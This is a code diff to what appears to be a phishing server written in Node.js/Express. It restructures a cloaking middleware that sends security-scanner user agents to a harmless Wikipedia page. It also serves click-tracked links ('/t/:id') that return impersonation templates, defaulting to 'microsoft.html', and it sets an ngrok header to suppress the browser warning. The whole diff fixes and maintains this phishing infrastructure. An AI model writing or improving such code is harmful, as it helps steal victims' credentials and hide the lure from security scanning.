@@ -128,14 +128,17 @@ function cloakingMiddleware(req, res, next) {
     if (suspiciousUA.some(bot => ua.includes(bot))) {
         return res.redirect('https://pt.wikipedia.org/wiki/Seguran%C3%A7a_da_informa%C3%A7%C3%A3o');
     }
-    // Middleware
-    const publicPath = path.join(process.cwd(), 'public');
-    app.use(express.static(publicPath));
-    app.use(express.json());
-    app.use((req, res, next) => { res.setHeader('ngrok-skip-browser-warning', 'true'); next(); });
+    next();
+}
 
-    app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'index.html')));
+// Middleware Configuration
+const publicPath = path.join(process.cwd(), 'public');
+app.use(express.static(publicPath));
+app.use(express.json());
+app.use((req, res, next) => { res.setHeader('ngrok-skip-browser-warning', 'true'); next(); });
 
+// Routes
+app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'index.html')));
 app.get('/api/vapid-public-key', (req, res) => res.json({ publicKey: vapidKeys ? vapidKeys.publicKey : null }));
 app.post('/api/heartbeat', (req, res) => res.json({ status: 'active' }));
 
@@ -153,10 +156,10 @@ app.get('/t/:id', cloakingMiddleware, async (req, res) => {
     if (link) {
         link.clicks++;
         await saveLink(link);
-        const templatePath = path.join(__dirname, 'public', `${link.template}.html`);
-        res.sendFile(fs.existsSync(templatePath) ? templatePath : path.join(__dirname, 'public', 'microsoft.html'));
+        const templatePath = path.join(publicPath, `${link.template}.html`);
+        res.sendFile(fs.existsSync(templatePath) ? templatePath : path.join(publicPath, 'microsoft.html'));
     } else {
-        res.sendFile(path.join(__dirname, 'public', 'microsoft.html'));
+        res.sendFile(path.join(publicPath, 'microsoft.html'));
     }
 });
 
